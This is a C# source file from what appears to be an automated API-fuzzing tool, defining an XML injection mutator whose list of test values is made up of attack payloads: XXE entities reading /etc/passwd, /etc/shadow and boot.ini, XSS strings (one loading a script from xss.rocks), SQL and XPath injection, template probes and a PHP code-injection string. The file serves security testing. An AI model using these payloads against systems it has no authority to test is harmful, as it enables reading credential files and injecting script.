﻿using System.Collections.Generic;

namespace ByrneLabs.TestoRoboto.HttpServices.JsonMutators
{
    public class XmlInjector : ValueChanger
    {
        protected override IEnumerable<object> TestValues => new object[]
        {
            @"-",
            @"' or ''='",
            @"' or '1'='1",
            @"""<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM """"file:////dev/random"""">]><foo>&xxe;</foo>""",
            @"""<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM """"file:////etc/passwd"""">]><foo>&xxe;</foo>""",
            @"""<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM """"file:////etc/shadow"""">]><foo>&xxe;</foo>""",
            @"""<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM """"file://c:/boot.ini"""">]><foo>&xxe;</foo>""",
            @"""<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?><foo><![CDATA[' or 1=1 or ''=']]></foo>""",
            @"""<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>""",
            @"""<HTML xmlns:xss><?import namespace=""""xss"""" implementation=""""http://xss.rocks/xss.htc""""><xss:xss>XSS</xss:xss></HTML>""",
            @"""<HTML xmlns:xss><?import namespace=""""xss"""" implementation=""""http://xss.rocks/xss.htc""""><xss:xss>XSS</xss:xss></HTML>""",
            @"""<xml ID=""""xss""""><I><B><IMG SRC=""""javas<!-- -->cript:alert('XSS')""""></B></I></xml><SPAN DATASRC=""""#xss"""" DATAFLD=""""B"""" DATAFORMATAS=""""HTML""""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>""",
            @"""<xml ID=I><X><C><![CDATA[<IMG SRC=""""javas]]><![CDATA[cript:alert('XSS');"""">]]>""",
            @"""<xml SRC=""""xsstest.xml"""" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>""",
            @"$",
            @"%",
            @"&apos;XoiZR",
            @"&lt;% Tnn96 %&gt;",
            @"&lt;%= Tnn96 %&gt;",
            @"&lt;? Tnn96 ?&gt;",
            @"&lt;?Tnn96 ?&gt;",
            @"&lt;Tnn96&gt;",
            @"&quot;XoiZR",
            @"(Tnn96)",
            @"*",
            @"*/*",
            @"/",
            @"//",
            @"//*",
            @":",
            @";",
            @"@",
            @"@*",
            @"[Tnn96]",
            @"]>",
            @"{{= Tnn96}}",
            @"{{Tnn96}}",
            @"{= Tnn96}",
            @"{Tnn96}",
            @"+",
            @"<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>",
            @"<![CDATA[<script>var n=0;while(true){n++;}</script>]]>",
            @"<!DOCTYPE autofillupload [<!ENTITY 9eTVC SYSTEM ""file:///etc/passwd"">",
            @"<!DOCTYPE autofillupload [<!ENTITY D71Mn SYSTEM ""file:///c:/boot.ini"">",
            @"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:///dev/random"">]><foo>&xee;</foo>",
            @"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><foo>&xee;</foo>",
            @"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:///etc/shadow"">]><foo>&xee;</foo>",
            @"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file://c:/boot.ini"">]><foo>&xee;</foo>",
            @"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foof>",
            @"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",
            @"<name>','')); phpinfo(); exit;/*</name>",
            @"x' or 1=1 or 'x'='y"
        };
    }
}
